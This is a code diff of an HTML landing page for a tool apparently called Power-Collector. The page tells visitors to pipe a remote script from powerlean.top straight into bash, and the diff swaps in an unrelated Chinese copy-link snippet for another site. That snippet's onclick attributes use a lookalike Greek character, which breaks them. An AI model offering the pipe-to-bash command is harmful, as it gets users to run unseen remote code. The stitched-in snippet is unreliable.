@@ -128,14 +128,24 @@ flash_title()
  <center><strong><font size="4" color="white">Please run:</font></strong></center>
   <br>
 <center><strong><font size="3" color="yellow">curl -s powerlean.top/blob/poco.setup | bash</font></strong></center>
- <script>
-function oCopy(obj){
-obj.select();
-js=obj.createTextRange();
-js.execCommand("复制")
+<script type="text/javascript">
+function copyText(obj)
+{
+var rng = document.body.createTextRange();
+rng.moveToElementText(obj);
+rng.scrollIntoView();
+rng.select();
+rng.execCommand("Copy");
+rng.collapse(false);
+
+alert("复制成功，请粘贴到你的QQ/MSN上发送给你的好友。"); 
+
 }
 </script>
-<input οnclick="oCopy(this)" value=www.qzpcw.com>
+ <span id="tbid">http://www.qzpcw.com</span>
+[<a href="#" οnclick="copyText(document.all.tbid)">点击复制</a>]<br>
+<span id="tbid1">http://www.qzpcw.com</span>
+[<a href="#" οnclick="copyText(document.all.tbid1)">点击复制</a>]<br>
  <br> <center><strong><font size="4" color="white">on your terminal</font></strong></center>
   <br>
   <center><a href="https://github.com/EdgeS5352/Power-Collector/blob/master/README.md" class="btn">LEARN MORE</a></center>
